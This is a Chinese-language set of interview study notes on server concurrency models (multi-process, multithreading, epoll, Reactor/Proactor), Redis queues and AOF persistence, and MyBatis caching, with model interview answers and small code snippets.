<p>多进程模型指的是：<strong>每当有一个新的客户端连接到服务器时，服务器就会创建一个新的进程来处理该客户端的请求</strong>。</p>
<h3 id="特点：-3">特点：</h3>
<ul>
<li>每个客户端由一个独立的进程负责。</li>
<li>使用 <code>fork()</code> 系统调用创建子进程。</li>
<li>每个子进程处理自己对应的客户端连接，读写操作互不干扰。</li>
</ul>
<h2 id="🔄-二、核心流程详解（结合图解说明）">🔄 二、核心流程详解（结合图解说明）</h2>
<h3 id="📍父进程（主进程）负责的事情：">📍父进程（主进程）负责的事情：</h3>
<ol>
<li>监听 Socket（listen）</li>
<li>等待连接（accept）</li>
<li>一旦连接建立，<code>accept()</code> 返回一个 “已连接 Socket”</li>
<li>使用 <code>fork()</code> 创建子进程，把这个“已连接 Socket”交给子进程处理</li>
</ol>
<h3 id="📍子进程负责的事情：">📍子进程负责的事情：</h3>
<ul>
<li>对客户端的连接执行 <code>read()</code> 和 <code>write()</code> 操作</li>
<li>一对一为客户端服务，互不干扰</li>
</ul>
<h3 id="💡注意：fork-是“复制”父进程">💡注意：fork() 是“复制”父进程</h3>
<ul>
<li>子进程会复制父进程的资源（代码段、内存空间、文件描述符等）</li>
<li>所以父子进程都可以操作“已连接 Socket”</li>
</ul>
<h2 id="⚙️-三、文件描述符的继承与关闭说明">⚙️ 三、文件描述符的继承与关闭说明</h2>
<blockquote>
<p>子进程继承了父进程的所有文件描述符（包括“已连接 Socket”）。</p>
</blockquote>
<p>但在处理连接时，为了避免<strong>重复读写同一个 socket</strong>，要做如下操作：</p>
<ul>
<li>父进程在 fork 之后，关闭已连接 socket（只保留监听 socket）</li>
<li>子进程则保留已连接 socket，关闭监听 socket</li>
</ul>
<p>这样做的好处是资源分配更合理，每个进程只处理它该处理的内容。</p>
<h2 id="🧠-四、子进程的退出与僵尸进程问题">🧠 四、子进程的退出与僵尸进程问题</h2>
<p>当子进程结束后，内核仍然会保留一些信息（如退出状态、资源统计等），直到父进程调用 <code>wait()</code> 或 <code>waitpid()</code> 来收尸。否则子进程会变成“僵尸进程”。</p>
<blockquote>
<p>所以要么定期主动 wait/waitpid，要么通过信号处理机制清理子进程资源。</p>
</blockquote>
<h2 id="📉-五、优缺点总结">📉 五、优缺点总结</h2>
<h3 id="✅-优点：">✅ 优点：</h3>
<ul>
<li>实现简单，逻辑清晰</li>
<li>每个客户端由一个进程独立处理，互不干扰</li>
<li>稳定性较高，不会一个出错影响全部</li>
</ul>
<h3 id="❌-缺点：">❌ 缺点：</h3>
<ul>
<li><strong>性能差</strong>：创建进程代价高，切换频繁</li>
<li><strong>资源占用高</strong>：每个子进程都要复制资源（内存、文件描述符等）</li>
<li><strong>扩展性差</strong>：如果有 10000 个连接，就要有 10000 个进程，资源爆炸</li>
</ul>
<blockquote>
<p>这就是为什么当连接数上升到几千几万时，多进程模型<strong>无法支撑高并发场景</strong>，更现代的模型如“多线程、事件驱动（Reactor）”逐渐成为主流。</p>
</blockquote>
<h2 id="🧩-六、总结一句话">🧩 六、总结一句话</h2>
<blockquote>
<p>多进程模型适用于<strong>并发量不大、追求稳定性</strong>的服务场景，但不适合高并发高性能的现代 Web 服务。</p>
</blockquote>
<blockquote>
<p>僵尸进程不是“运行中的进程”，而是子进程退出后，父进程没有清理它的“尸体信息”导致的内核残留，必须通过 <code>wait()</code> / <code>waitpid()</code> 或信号处理机制来手动清理。</p>
</blockquote>
<h2 id="🧟♂️-一、什么是僵尸进程？">🧟♂️ 一、什么是僵尸进程？</h2>
<p>当一个<strong>子进程执行完毕退出</strong>后，它的<strong>进程描述信息</strong>（如 PID、退出状态等）不会马上被内核清除，而是<strong>保留在内核中，等待父进程来读取</strong>。</p>
<p>这种“已经退出但没被父进程回收”的进程，就叫做 <strong>僵尸进程（Zombie Process）</strong>。</p>
<blockquote>
<p>⚠️ 僵尸进程不是“还在运行”的进程，而是“尸体没埋”的进程。</p>
</blockquote>
<h2 id="🔍-二、为什么会有僵尸进程？">🔍 二、为什么会有僵尸进程？</h2>
<p>因为 Linux/Unix 系统设计中，每个子进程退出后，其状态需要父进程通过 <code>wait()</code> 或 <code>waitpid()</code> 来显式回收，否则内核就不会释放其资源（尤其是 PID）。</p>
<p>如果父进程从不回收，久而久之会导致：</p>
<ul>
<li>系统中的 PID 被占满（最大 PID 数量有限）</li>
<li>无法创建新的进程</li>
<li>系统异常、性能下降</li>
</ul>
<h2 id="多线程模型">多线程模型</h2>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MjA2MjI3ZDI2MzE4OGUyM2M0OWNlMTQ4YjlhYjk4N2ZfRXN0M05XSTFmVlRjOVZrcklmeFlQUHBuNUgxd25rMkRfVG9rZW46VkI3VmJ3THJjb0VuOWF4M3AzRmN6VGVabmxmXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>上面基于进程或者线程模型的，其实还是有问题的。新到来一个 TCP 连接，就需要分配一个进程或者线程，那么如果要达到 C10K，意味着要一台机器维护 1 万个连接，相当于要维护 1 万个进程/线程，操作系统就算死扛也是扛不住的</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YWVhNTgzYWNmZTA2NjIxNTc0MTQzMDk0MjdlNjIzMWFfb3cyNTd5cjdNdkdjakNtNjNxMnNPYkFQcWJhVlpMQ29fVG9rZW46RHByb2JxQ0hOb1BjRnF4MU54NWN2RXA2bmpjXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MmQ2MjcwMDMxYjQ4ZWNjNDc1ZmJhNDMzZjJmMTliZWJfNTlkTHJ2ZHBKeVZBdE9KTUFEbDFWWUxBaElaWW9pZWhfVG9rZW46UjR4U2JmazNCb0hnc0R4MEJRN2M2MmhSbmVnXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YTZjNWFjNGIzNzc2YmM1N2I4YTcyNTIyMzJkZmUzZThfYjE4bUszTkJ2aG1ZdWVweXlMeUF3VEZmdWY4dHV2RUZfVG9rZW46V2hMaGJUYnJVb0NsYXZ4Y3dmdWNtcVhubkNlXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="IO多路复用">IO多路复用</h2>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=NWEzYTZhMWM3NDNjMTViNzRlMTgxNWI2Mjc3ZTg1NDRfMEV2VENkeW9QSEd3aTBIZUV0Y29qU3pHdm5nWXlucGlfVG9rZW46UUVVdGJmdmlUbzh3RkN4T2M2VmM0ZFlGbkJkXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YTdiYzAxNGIzOTdiZTFmYTJkMDJiNjQwNGQ0MTQyN2JfamhSbkFPZWdET1RyTUJPaXN3ekl2dG1WSFpmanowcVRfVG9rZW46UWJSeGJsbEhKb2V5WEV4em1QbWMzZWRnblZiXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZmQ1Y2MzZGJlMDM1YTBkZWE0YjM0NmRhODBhMGQxYTRfVU1lRVVnam02UzJWUnVmeVlPNmV1OENkNktQYnRNd3hfVG9rZW46S3F2dWJuQnI2b3hkTER4b04wcmNRSFVTbkhmXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YWZkN2NlOGIzMTg4MWU0N2RmNmFhZDdjZWJhNmUwYjJfQm5OaFBmdm05MU51MEY4enNraGhKcUFFWTF6d3B5SW1fVG9rZW46UWxUQ2JUZEJjb2V6eEZ4ZDZpTmNFWWoybkxkXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MTE1YWIwMTZmZjQ2ZDE3NTEzZTNiMDk4MjI0MTVlMjZfaXR5TmZ6azJndTNuS0R5MG5Vc3RrYnpCZlBoOVZnOEhfVG9rZW46UUhDbWIxOXYzb0pnRWR4M1V2dGNwMm1lblJnXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MTkyODlmOGQ1Y2FlNTQ0OWEyODZlZTIzMTM0ODM2ZWVfWkNHd1ZDbDFCVWdPMlZQYzE5dm9ETnRPb2tmUlR1dWtfVG9rZW46UHFURWJmR1hIb0VZSmh4b2hZNGNtQ2ZDbmRlXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=OGZjMDVlZjdjNWU3MTZjMWU3YjhiMjZlNDYxMTlmMGJfQmFORE9leHFwczZuaVJWVlJhTnJZZnRUeHFTMUpKaTlfVG9rZW46QUFMMmJzeTZkb1luNm54R1VIbmNITjRPbmtmXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=NTA5Y2NkOTBlMzFkNTZlMmZhMzlhOGRhY2I1MWQxYTJfTnhlU3lRVWUySm1maEoyUlpQMHd2ZlNhejNtVjV3VU5fVG9rZW46WUVEVGJTZVd4b2JobTZ4em94dWNJMGdxbm9lXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YmFhYzczNzRiZTYyZWViNThhMjBkZWZkYmY1OTI3ZjhfNmVheFRldTQ5WFFsdGE5dmoxdFNheWlyZktKYjZLQnFfVG9rZW46WkpCMWJvbG54b0xDWEV4aDlPV2NiR2R5bklnXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h3 id="边缘触发和水平触发">边缘触发和水平触发</h3>
<p>epoll 支持两种事件触发模式，分别是边缘触发（<em>edge-triggered，ET</em>）和水平触发（<em>level-triggered，LT</em>）。</p>
<ol>
<li>使用边缘触发模式时，当被监控的 Socket 描述符上有可读事件发生时，服务器端只会从 epoll_wait 中苏醒一次，即使进程没有调用 read 函数从内核读取数据，也依然只苏醒一次，因此我们程序要保证一次性将内核缓冲区的数据读取完；</li>
<li>使用水平触发模式时，当被监控的 Socket 上有可读事件发生时，服务器端不断地从 epoll_wait 中苏醒，直到内核缓冲区数据被 read 函数读完才结束，目的是告诉我们有数据需要读取；</li>
</ol>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZmZlMzNmOGU0ZWJkZjM4ZWZiMWM1OTM5NTkwMzE5MGRfUzNsMHRQSkFnelJBaGlnd2V2R3lCUkp5MjQ1M21WMmRfVG9rZW46TmxHcmJFSVNNbzZNTHZ4Z0JwOGNBNzc0bkJpXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ODJlNzNlN2Q1MWNlYWRjZTE2MTJiYmMwNzgxNThjYzBfS3NMRUpucGhFQUppN1dFVnIzZTRMZDlBSlhYRXZ4dzFfVG9rZW46WTg4NmIxNW1Ib1hqTjV4ZWtFQWNzUmU1bnNiXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h1>1</h1>
<p>现代操作系统（如 Linux）支持将<strong>同一个进程的多个线程分配到不同的 CPU 核上运行</strong>，这是通过<strong>线程调度器</strong>（Scheduler）实现的。线程虽然属于同一个进程，但在调度上是独立的。</p>
<blockquote>
<h2 id="💡-多线程-单进程，怎么就能利用多核了？">💡 多线程 + 单进程，怎么就能利用多核了？</h2>
</blockquote>
<p>一个进程中的多个线程共享地址空间（代码段、数据段、堆等），但它们拥有独立的：</p>
<ul>
<li><strong>程序计数器</strong></li>
<li><strong>栈</strong></li>
<li><strong>寄存器状态</strong></li>
</ul>
<p>因此，操作系统调度器可以将这些线程<strong>分配到多个核心</strong>并行执行，例如：</p>
<table>
<thead>
<tr>
<th>核心</th>
<th>执行线程</th>
</tr>
</thead>
<tbody>
<tr>
<td>CPU 0</td>
<td>Thread A（处理用户登录）</td>
</tr>
<tr>
<td>CPU 1</td>
<td>Thread B（处理数据查询）</td>
</tr>
<tr>
<td>CPU 2</td>
<td>Thread C（处理缓存更新）</td>
</tr>
</tbody>
</table>
<p>所以——<strong>多线程在一个进程里照样能“跑满”多核 CPU。</strong></p>
<h2 id="🧠-面试回答范式（你可以这样说）：">🧠 面试回答范式（你可以这样说）：</h2>
<blockquote>
<p>是的，现代操作系统调度机制已经完全支持多线程在多核上并发执行。即使线程都属于同一个进程，只要线程之间没有大量的锁竞争或者阻塞，操作系统会尽量将它们调度到不同的核心上执行，从而实现真正的并行计算。所以多线程程序完全可以充分利用多核 CPU，特别适用于 CPU 密集型场景，比如并发图像处理、加密计算等。</p>
</blockquote>
<h2 id="✅-多核-CPU-下的并发执行能力">✅ 多核 CPU 下的并发执行能力</h2>
<h3 id="✅-1-多进程：天生适合多核">✅ 1. <strong>多进程</strong>：天生适合多核</h3>
<ul>
<li>每个进程是独立的，拥有自己的内存空间、资源、文件描述符等。</li>
<li>操作系统可以很自然地将<strong>不同进程调度到不同 CPU 核心</strong>上执行，完全并行。</li>
</ul>
<p>📌 <strong>优点</strong>：进程隔离强，安全性高 📌 <strong>缺点</strong>：内存开销大，进程间通信（IPC）复杂，切换代价高</p>
<h3 id="✅-2-单进程-多线程：同样可以跑满多核">✅ 2. <strong>单进程 + 多线程</strong>：同样可以跑满多核</h3>
<ul>
<li>线程是进程内的最小调度单位，<strong>共享内存空间</strong>，但调度是“线程级别”的。</li>
<li>操作系统调度器会把活跃线程分配到多个核心，达到并行效果。</li>
</ul>
<p>📌 <strong>优点</strong>：共享内存通信效率高，资源开销小 📌 <strong>缺点</strong>：线程安全问题（锁竞争、死锁）、一个线程崩了可能整个进程都挂</p>
<h1>Reactor和Proactor</h1>
<h2 id="🔹一、Reactor-和-Proactor-模型核心区别">🔹一、Reactor 和 Proactor 模型核心区别</h2>
<table>
<thead>
<tr>
<th>特性</th>
<th>Reactor 模式（同步 I/O）</th>
<th>Proactor 模式（异步 I/O）</th>
</tr>
</thead>
<tbody>
<tr>
<td>IO 操作谁完成</td>
<td>应用程序完成 IO 操作（如 read/write）</td>
<td>操作系统完成 IO 操作</td>
</tr>
<tr>
<td>事件通知时机</td>
<td>通知“事件就绪” → 由应用程序主动去处理</td>
<td>通知“操作已完成” → 应用程序处理结果</td>
</tr>
<tr>
<td>适用场景</td>
<td>Linux 常用（select、poll、epoll 都是 Reactor 模式）</td>
<td>Windows 常用（IOCP 就是典型 Proactor 模型）</td>
</tr>
<tr>
<td>性能瓶颈</td>
<td>CPU 不够强时，处理请求速度慢</td>
<td>需要操作系统支持异步 IO；实现更复杂但效率高</td>
</tr>
</tbody>
</table>
<h2 id="🔹二、详细理解两者流程图">🔹二、详细理解两者流程图</h2>
<h3 id="✅Reactor-模式工作流程">✅Reactor 模式工作流程</h3>
<ol>
<li>应用注册 socket 到 IO 多路复用（如 epoll）。</li>
<li>当 socket 可读/可写时，epoll 返回事件。</li>
<li>应用程序调用 read/write 完成 IO。</li>
<li>应用程序处理数据。</li>
</ol>
<p>➡️ 重点：<strong>内核只是告诉你“可以读写了”，实际读写还要你自己来。</strong></p>
<h3 id="✅Proactor-模式工作流程">✅Proactor 模式工作流程</h3>
<blockquote>
<p>对应你图中的流程图：</p>
</blockquote>
<ol>
<li>应用调用 API 注册 socket（Proactor Initiator）。</li>
<li>内核或专门线程（Asynchronous Operation Processor）执行 read/write 操作。</li>
<li>数据传输完成后，操作系统通知事件完成（Proactor）。</li>
<li>应用直接收到“已完成”的事件，处理业务逻辑（Handler）。</li>
</ol>
<p>➡️ 重点：<strong>应用不关心 IO 的过程，操作系统直接搞定 IO，然后告诉你“好了”。</strong></p>
<h2 id="🔹三、类比场景助理解">🔹三、类比场景助理解</h2>
<ul>
<li>**Reactor：**快递员打电话说：“我快到了，你下楼来拿吧。”（你自己处理）</li>
<li>**Proactor：**快递员直接把快递送到你门口，然后通知你：“到了。”（系统代劳）</li>
</ul>
<p>如果面试官问：</p>
<blockquote>
<p>“你能说说 Reactor 和 Proactor 模型的区别吗？”</p>
</blockquote>
<p>你可以这样答：</p>
<p><strong>答题模板：</strong></p>
<blockquote>
<p>Reactor 和 Proactor 是两种基于事件驱动的网络编程模型。</p>
<ul>
<li>Reactor 模式采用同步 IO，内核通知“事件已就绪”，但实际的 read/write 是由应用完成的。常见于 Linux 的 epoll/select。</li>
<li>Proactor 模式采用异步 IO，IO 操作由内核完成，应用只需处理最终结果。常见于 Windows 的 IOCP。</li>
</ul>
<p>直观理解，Reactor 更像是“我来处理 IO”，而 Proactor 是“系统帮我处理 IO”，我只管业务处理。</p>
<p>在 Linux 中，由于原生异步 IO 支持不够好，所以多数场景还是用 Reactor，如 Nginx、Netty、Redis（6.0 前）都用的就是 Reactor。</p>
<p>Proactor 更适合在 Windows 平台开发高性能网络程序。</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDM4YThjYzhhYjRhZTFkZjc2MTE2Mjc0MDRjNDU3M2ZfdjJ4RGk5bEVkU2JpOTEyTjhWRFFZdEFIYXFTZFFXY01fVG9rZW46UnNCRGJQQmRSb21qSjF4OWVuYWNtSDVrbkpoXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h1>Redis（小林）</h1>
<h2 id="List类型和Redis-Stream类型">List类型和Redis Stream类型</h2>
<blockquote>
<p>redis的List 类型的应用场景：消息队列（但是有两个问题：1. 生产者需要自行实现全局唯一 ID；2. 不能以消费组形式消费数据）等</p>
</blockquote>
<h2 id="✅-Redis-的-List-用作消息队列-——-是怎么做的？">✅ Redis 的 List 用作消息队列 —— 是怎么做的？</h2>
<p>Redis 的 List 是一个双端队列，常用命令：</p>
<ul>
<li><code>LPUSH queue value</code>：从左边入队</li>
<li><code>RPUSH queue value</code>：从右边入队</li>
<li><code>LPOP queue</code>：从左边出队（消费者取消息）</li>
<li><code>BRPOP queue timeout</code>：阻塞式出队（更适合消费）</li>
</ul>
<p>这种模式就能实现一个<strong>简单的队列模型</strong>，消息先进先出，写入一端、读取另一端，常被拿来做：</p>
<ul>
<li>异步任务处理</li>
<li>短时消息缓冲</li>
<li>简易日志队列</li>
</ul>
<h2 id="❗但为什么说它“有两个问题”？">❗但为什么说它“有两个问题”？</h2>
<h3 id="🔸问题-1：生产者需要自己生成全局唯一-ID">🔸问题 1：<strong>生产者需要自己生成全局唯一 ID</strong></h3>
<h4 id="💬-什么意思？">💬 什么意思？</h4>
<p>Redis 的 List 元素本质就是普通的字符串，它<strong>不会自动给你加上 ID</strong>，不像 Kafka/RabbitMQ 那种“消息自带 offset 或 ID”。</p>
<p>➡️ 如果你业务上需要唯一 ID（比如用于幂等处理、日志追踪），<strong>你得自己生成</strong>，比如用 UUID、时间戳、雪花算法等。</p>
<h4 id="✅-举例：">✅ 举例：</h4>
<figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LPUSH <span class="keyword">queue</span> &#123;<span class="string">&quot;id&quot;</span><span class="operator">:</span> <span class="string">&quot;order_123&quot;</span>, <span class="string">&quot;data&quot;</span><span class="operator">:</span> <span class="string">&quot;xxxx&quot;</span>&#125;  # 你得自己加上 <span class="built_in">id</span> 字段</span><br></pre></td></tr></table></figure>
<h3 id="🔸问题-2：不支持消费组（即多个消费者独立消费）">🔸问题 2：<strong>不支持消费组（即多个消费者独立消费）</strong></h3>
<h4 id="💬-什么意思？-2">💬 什么意思？</h4>
<p>Redis List 是“<strong>点对点消费模型</strong>”：</p>
<ul>
<li>一条消息被某一个消费者读了之后，就没了。</li>
<li>不能像 Kafka 那样支持多个消费组、多个消费者组各自独立消费、进度追踪等。</li>
</ul>
<h4 id="🚫-结果就是：">🚫 结果就是：</h4>
<ul>
<li>多个消费者只能“抢消息”</li>
<li>没有 offset、没有消费确认、没有自动重试</li>
<li><strong>不适合高可靠消费场景（比如金融、电商订单流转）</strong></li>
</ul>
<h2 id="✅-怎么办？有更好的方案吗？">✅ 怎么办？有更好的方案吗？</h2>
<p>是的！Redis 后来推出了专门用于消息队列场景的数据结构：</p>
<h3 id="🔹Redis-Stream（推荐替代）">🔹Redis Stream（推荐替代）</h3>
<p>Redis Stream（从 Redis 5.0 引入）支持：</p>
<table>
<thead>
<tr>
<th>能力</th>
<th>Redis List</th>
<th>Redis Stream</th>
</tr>
</thead>
<tbody>
<tr>
<td>全局消息 ID</td>
<td>❌（需要自建）</td>
<td>✅ 自动生成（时间戳+序号）</td>
</tr>
<tr>
<td>消费组</td>
<td>❌</td>
<td>✅ 多个消费者独立消费</td>
</tr>
<tr>
<td>消费进度管理</td>
<td>❌</td>
<td>✅ 支持 ACK、pending 等</td>
</tr>
<tr>
<td>可持久化流式日志</td>
<td>❌</td>
<td>✅ 非常适合</td>
</tr>
</tbody>
</table>
<h2 id="🎯面试回答建议：">🎯面试回答建议：</h2>
<blockquote>
<p>Redis 的 List 可以实现基本的队列功能，适合一些简单的异步处理场景，但它缺乏像 Kafka 那样的消息 ID 管理和消费组机制，存在两个问题：</p>
<ol>
<li>消息没有唯一 ID，需要业务侧生成；</li>
<li>不能支持多个消费组并发消费同一消息，容易造成消费混乱。</li>
</ol>
<p>在需要可靠消息队列、消息追踪、消费进度管理的场景下，更推荐使用 Redis Stream，它支持自动 ID、消费组、ACK 等功能，是 Redis 官方针对消息队列场景的增强实现。</p>
</blockquote>
<h2 id="AOF刷盘">AOF刷盘</h2>
<h2 id="🧩-一句话概括">🧩 一句话概括</h2>
<blockquote>
<p><strong>AOF刷盘</strong>指的是：Redis 把写入命令追加到日志文件（AOF 文件）里，并<strong>刷写（flush）到磁盘</strong>的这个过程。</p>
</blockquote>
<h2 id="🔧-背景：Redis-是内存数据库，为什么需要-AOF？">🔧 背景：Redis 是内存数据库，为什么需要 AOF？</h2>
<ul>
<li>Redis 是把数据存在内存中的，速度很快，但：</li>
</ul>
<blockquote>
<p>断电了、挂掉了，内存没了，数据也就全没了 ❌</p>
</blockquote>
<ul>
<li>所以需要<strong>持久化机制</strong>：
<ul>
<li>RDB（快照）⏳：定期保存整个数据快照</li>
<li><strong>AOF（日志）📄</strong>：<strong>每次写操作都记录一条日志，落盘保存</strong></li>
</ul>
</li>
</ul>
<h2 id="🗂-AOF-工作流程">🗂 AOF 工作流程</h2>
<p>举个例子，你执行一个命令：</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> name <span class="comment">&quot;小明&quot;</span></span><br></pre></td></tr></table></figure>
<p>Redis 会执行以下动作：</p>
<ol>
<li>内存写入成功 ✅</li>
<li>把这条命令 <code>SET name &quot;小明&quot;</code> <strong>追加（Append）到 AOF 缓冲区</strong></li>
<li>根据 AOF 策略，把缓冲区的数据<strong>刷盘（写入磁盘）</strong></li>
</ol>
<blockquote>
<p>AOF 文件就是这样一行一行命令组成的，用于恢复数据。</p>
</blockquote>
<h2 id="💡什么叫“刷盘”？">💡什么叫“刷盘”？</h2>
<p>刷盘（flush to disk）就是把数据<strong>从内存缓冲区写入磁盘文件</strong>，确保数据真正落地，哪怕宕机后也能恢复。</p>
<h2 id="🧰-AOF-的刷盘策略（3-种）">🧰 AOF 的刷盘策略（3 种）</h2>
<p>你可以在 <code>redis.conf</code> 里设置参数：</p>
<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">appendfsync always     # 每个命令都刷盘，最安全，最慢` `appendfsync everysec   # 每秒刷盘一次，性能和安全折中 ✅（默认）` `appendfsync no         # 由操作系统决定什么时候刷盘，性能好，但最不安全</span><br></pre></td></tr></table></figure>
<h2 id="🔁-AOF-恢复机制（宕机重启）">🔁 AOF 恢复机制（宕机重启）</h2>
<ol>
<li>Redis 启动时读取 AOF 文件</li>
<li>从头到尾<strong>重放所有写命令</strong></li>
<li>把内存恢复到宕机前的状态 ✅</li>
</ol>
<h2 id="🧠-面试回答模板">🧠 面试回答模板</h2>
<blockquote>
<p>Redis 提供两种持久化方式：RDB 和 AOF。其中 AOF 是日志形式的持久化，每次写操作都会追加到一个日志文件中。这个过程就叫“刷盘”，表示将写入命令写入到磁盘，防止数据丢失。</p>
<p>Redis 支持三种刷盘策略：always（每次操作都刷盘）、everysec（每秒刷盘一次，默认）、no（操作系统控制），一般推荐使用 <code>everysec</code>，它在性能和数据安全之间做了良好平衡。</p>
<p>AOF 文件还能用于 Redis 的宕机恢复，具有更强的数据可追溯性。不过也有缺点，比如文件体积较大，加载速度比 RDB 慢一些。</p>
</blockquote>
<h1>mybatis一级缓存和二级缓存</h1>
<h2 id="两者的定义">两者的定义</h2>
<h1>✅ 一、MyBatis 一级缓存</h1>
<h3 id="📖-定义：">📖 定义：</h3>
<p>一级缓存是 <strong>SqlSession 级别的缓存</strong>，<strong>默认开启</strong>。 一次 <code>SqlSession</code> 中，多次查询相同数据，会<strong>优先从缓存中拿</strong>，不会每次都去查数据库。</p>
<h3 id="⚙️-特点：">⚙️ 特点：</h3>
<p>范围：当前 <code>SqlSession</code> 内有效</p>
<p>生命周期：<code>SqlSession</code> 关闭或清空缓存（<code>clearCache()</code>）后，缓存失效</p>
<p>开关：默认开启，几乎不用配置</p>
<h3 id="📦-示例：">📦 示例：</h3>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SqlSession <span class="keyword">session</span> = sqlSessionFactory.openSession();` `UserMapper mapper = <span class="keyword">session</span>.getMapper(UserMapper.<span class="keyword">class</span>); ` `// 第一次查询，走数据库 ``<span class="keyword">User</span> user1 = mapper.selectById(<span class="number">1</span>); ` `// 第二次查询，同一个 <span class="keyword">session</span>，同样的参数，走缓存 ``<span class="keyword">User</span> user2 = mapper.selectById(<span class="number">1</span>); ``<span class="keyword">System</span>.<span class="keyword">out</span>.println(user1 == user2); // <span class="keyword">true</span> （引用相同）` `<span class="keyword">session</span>.<span class="keyword">close</span>();</span><br></pre></td></tr></table></figure>
<h3 id="🚨-一级缓存失效的情况（常考）：">🚨 一级缓存失效的情况（常考）：</h3>
<ul>
<li><code>SqlSession</code> 不同</li>
<li>执行了增删改操作（刷新缓存）</li>
<li>手动调用了 <code>session.clearCache()</code></li>
<li>查询条件不同</li>
</ul>
<h1>✅ 二、MyBatis 二级缓存</h1>
<h3 id="📖-定义：-2">📖 定义：</h3>
<p>二级缓存是 <strong>Mapper 映射级别的缓存</strong>（跨 <code>SqlSession</code>）。 <strong>需要手动开启和配置</strong>！</p>
<h3 id="⚙️-特点：-2">⚙️ 特点：</h3>
<p>范围：同一个 Mapper 下的不同 <code>SqlSession</code> 共享</p>
<p>生命周期：存活在 Mapper 生命周期内</p>
